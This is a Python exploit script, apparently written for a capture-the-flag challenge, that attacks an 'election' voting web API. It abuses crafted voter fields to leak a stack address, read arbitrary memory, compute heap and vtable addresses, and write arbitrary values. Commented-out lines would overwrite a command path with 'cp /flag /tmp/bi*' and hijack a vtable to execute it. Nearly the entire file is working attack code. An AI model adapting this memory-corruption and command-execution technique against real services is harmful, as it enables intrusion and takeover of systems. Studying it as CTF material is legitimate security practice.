import sys
import re
import json
import struct
import requests


AUTH_TOKEN = "pbBVZ2NkAgyQJhk6SCZqDv07UDLmgt_Ex9-s-_75hvI="
BITCOIN_ADDR = "1Cg8GpMQLFZQdFqPYn9rab7UGEjMryhwQa"
DOGECOIN_ADDR = "DPENk2dBYh66F3Z7unkVR5qoQiuc19Qngv"
ETHEREUM_ADDR = "0xfb7Acb0446d200F21602ce3Fe25990BE1a5331D8"
VALUE_PAT = re.compile(r"\(([^)]+)\)")


def parse_value(x):
    m = VALUE_PAT.search(x)
    if not m:
        return None
    return int(m.group(1), 16)


def run_command(p):
    u = "{}/election/dc2019/vote".format(p)
    b = {
        "voter": "wOOOO",
        "votes": {
            "best_ctf_team": {
                "candidate": "Shellphish",
                "currency": "ethereum",
                "amount": 0.1,
            },
        },
    }

    r = requests.post(u, data=json.dumps(b))
    print(r.content.decode())
    return None


def leak_stack_addr(p):
    u = "{}/election/dc2019/vote".format(p)
    b = {
        "voter": ETHEREUM_ADDR,
        "votes": {
            "best_ctf_team": {
                "candidate": "Shellphish",
                "currency": "ethereum",
                "amount": 0.1,
            },
        },
    }

    r = requests.post(u, data=json.dumps(b))
    print(r.content)
    addr = parse_value(r.content.decode())
    return addr


def read_data(p, addr):
    u = "{}/election/dc2019/vote".format(p)
    sender = "1Cg8{:x}".format(addr)
    b = {
        "voter": sender,
        "votes": {
            "best_ctf_team": {
                "candidate": "Shellphish",
                "currency": "bitcoin",
                "amount": 0.1,
            },
        },
    }

    r = requests.post(u, data=json.dumps(b))
    data = parse_value(r.content.decode())
    return data


def write_data(p, addr, value):
    u = "{}/election/dc2019/vote".format(p)
    sender = "D000{:x} {:x}".format(addr, value)
    b = {
        "voter": sender,
        "votes": {
            "best_ctf_team": {
                "candidate": "Shellphish",
                "currency": "dogecoin",
                "amount": 0.1,
            },
        },
    }

    r = requests.post(u, data=json.dumps(b))
    data = parse_value(r.content.decode())
    return data


def pull_log(p, name):
    u = "{}/exchange/{}/tx_log".format(p, name)
    r = requests.get(u)
    return r.content.decode()


def main():
    p = "http://{}:{}/api/v1".format(sys.argv[1], sys.argv[2])
    u = "{}/election/list".format(p)
    r = requests.get(u)
    # print(r.json())

    u = "{}/election/dc2019/status".format(p)
    h = {
        "X-Election-Debug": "8192",
        "X-Election-Auth": AUTH_TOKEN,
    }

    r = requests.get(u, headers=h)
    if r.status_code != 200:
        return 1

    stack_addr = leak_stack_addr(p)
    print("stack_addr={:x}".format(stack_addr))

    for offset in range(0, 1024, 8):
        stack_value = read_data(p, stack_addr + offset)
        print("{:016x}: {:016x}".format(stack_addr + offset, stack_value))

    heap_leak_offset = 0x368
    heap_leak_addr = stack_addr + heap_leak_offset
    heap_leak = read_data(p, heap_leak_addr)
    print("heap_leak={:x}".format(heap_leak))

    debug_vtable_offset = 0x7ce0
    debug_vtable = heap_leak - debug_vtable_offset
    print("debug_vtable={:x}".format(debug_vtable))

    ethereum_object_offset = 0xd260
    ethereum_object = heap_leak + ethereum_object_offset
    print("ethereum_object={:x}".format(ethereum_object))

    path_offset = 0xd350
    path = heap_leak + path_offset
    print("path={:x}".format(path))

    # write_data(p, path, struct.unpack("<Q", b"cp /flag")[0])
    # write_data(p, path + 8, struct.unpack("<Q", b" /tmp/bi")[0])
    # write_data(p, path + 16, struct.unpack("<Q", b"*;      ")[0])
    # write_data(p, ethereum_object, debug_vtable)
    # run_command(p)

    data = pull_log(p, "bitcoin")
    print(data)

    return 0


if __name__ == "__main__":
    sys.exit(main())
